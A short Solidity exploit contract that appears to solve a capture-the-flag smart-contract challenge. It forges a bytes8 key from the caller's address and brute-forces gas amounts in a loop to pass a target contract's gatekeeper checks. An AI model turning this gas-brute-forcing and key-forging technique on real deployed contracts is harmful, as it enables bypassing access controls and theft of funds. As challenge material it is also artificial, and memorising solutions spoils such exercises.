// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GateOne {
    function enter(address _gate) public returns (bool) {
        bytes8 key = bytes8(uint64(uint160(msg.sender))) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint256 i = 0; i < 8191; i++) {
          (bool success, ) = address(_gate).call{gas: (i + (8191 * 3))}(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }
        return succeeded;
    }

}
